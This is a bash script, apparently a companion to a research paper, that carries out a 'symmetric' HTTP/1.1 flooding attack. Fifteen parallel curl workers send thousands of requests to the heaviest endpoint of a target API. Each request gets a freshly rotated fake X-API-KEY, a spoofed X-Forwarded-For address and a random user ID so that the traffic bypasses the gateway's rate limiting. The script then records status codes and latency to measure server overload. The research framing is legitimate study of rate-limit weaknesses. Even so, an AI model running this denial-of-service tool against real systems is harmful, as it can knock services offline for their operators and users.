#!/usr/bin/env bash
# -----------------------------------------------------------------------------
# Algorithm 3 — Symmetric HTTP/1.1 Attack (CURL variant).
#
# Companion to algorithm3_symmetric.py. Mirrors §VI.C.2 of the paper:
#  "Shell script was written to launch Symmetric and Asymmetric attacks using
#   CURL and by changing the headers of the request to bypass the rate limit
#   for HTTP/1.1 and HTTP/2 to test the CPU utilization of the servers..."
#
# Each request gets a freshly-rotated X-API-KEY drawn from the three buckets
# the gateway recognises (AX001*, BX001*, other) so consecutive calls fall
# into different rate-limit windows.
#
# Usage:
#   ./algorithm3_symmetric.sh <targets.json> [requests_per_client] [clients]
#
# Requires: bash 4+, curl, jq.
# -----------------------------------------------------------------------------
set -u
# Force C locale so awk/printf use '.' as decimal separator (CSV stability).
export LC_ALL=C
# Intentionally NOT set -e: a single curl failure is expected during overload
# and must not abort the loop.

if [[ $# -lt 1 ]]; then
    echo "usage: $0 <targets.json> [requests_per_client=2000] [clients=15]" >&2
    exit 2
fi

TARGETS_JSON="$1"
REQUESTS="${2:-2000}"
CLIENTS="${3:-15}"

command -v jq >/dev/null || { echo "jq required" >&2; exit 1; }
command -v curl >/dev/null || { echo "curl required" >&2; exit 1; }

BASE_URL="$(jq -r '.base_url' "$TARGETS_JSON")"
METHOD="$(jq -r '.heavy_by_latency[0].method' "$TARGETS_JSON")"
PATH_="$(jq -r '.heavy_by_latency[0].path'   "$TARGETS_JSON")"

if [[ "$BASE_URL" == "null" || "$METHOD" == "null" || "$PATH_" == "null" ]]; then
    echo "[!] could not read base_url / heavy_by_latency[0] from $TARGETS_JSON" >&2
    exit 1
fi

OUT_DIR="$(dirname "$TARGETS_JSON")"
TS="$(date +%s)"
LOG="${OUT_DIR}/symmetric_curl_${TS}.csv"
echo "worker,iteration,epoch,status,latency_ms" > "$LOG"

echo "[+] symmetric curl attack: ${METHOD} ${BASE_URL}${PATH_}" >&2
echo "[+] clients=${CLIENTS} requests/client=${REQUESTS} total=$(( CLIENTS * REQUESTS ))" >&2
echo "[+] log: ${LOG}" >&2

rand_key() {
    local prefixes=(AX001- BX001- ZZ000-)
    local p=${prefixes[$RANDOM % 3]}
    local suf=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 8)
    printf "%s%s" "$p" "$suf"
}
rand_xff() {
    printf "10.%d.%d.%d" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%254+1))
}
rand_user() {
    local suf=$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c 6)
    printf "u-%s" "$suf"
}

worker() {
    local id="$1"
    local i
    for (( i = 0; i < REQUESTS; i++ )); do
        local key xff usr
        key=$(rand_key); xff=$(rand_xff); usr=$(rand_user)
        # %{http_code};%{time_total}
        local out
        out=$(curl --silent --output /dev/null \
                    --write-out '%{http_code};%{time_total}' \
                    --max-time 15 \
                    -X "${METHOD}" \
                    -H "X-API-KEY: ${key}" \
                    -H "X-Forwarded-For: ${xff}" \
                    -H "X-User-Id: ${usr}" \
                    -H "User-Agent: Algo3-Sym-CURL/${id}" \
                    -H "Accept: application/json" \
                    -H "Content-Type: application/json" \
                    --data '{}' \
                    "${BASE_URL}${PATH_}" 2>/dev/null) || out="000;0"
        local status="${out%%;*}"
        local ms; ms=$(awk -v t="${out##*;}" 'BEGIN{printf "%.2f", t*1000}')
        printf "%d,%d,%d,%s,%s\n" "$id" "$i" "$(date +%s)" "$status" "$ms" \
            >> "$LOG"
    done
}

t0=$(date +%s)
for (( c = 0; c < CLIENTS; c++ )); do
    worker "$c" &
done
wait
t1=$(date +%s)

dt=$(( t1 - t0 ))
total=$(( CLIENTS * REQUESTS ))
echo "[+] done in ${dt}s | total=${total} | ~$(( total / (dt > 0 ? dt : 1) )) rps" >&2
echo "[+] CSV: ${LOG}" >&2

# Quick summary
awk -F, 'NR>1 {
    if ($4 ~ /^2/) two++
    else if ($4 ~ /^4/) four++
    else if ($4 ~ /^5/) five++
    if ($4=="429" || $4=="503" || $4=="509" || $4=="520") ovr++
    if ($4!="000") {sum+=$5; n++}
}
END {
    printf "2xx=%d 4xx=%d 5xx=%d overload=%d avg_ms=%.2f\n",
        two, four, five, ovr, (n? sum/n : 0)
}' "$LOG" >&2
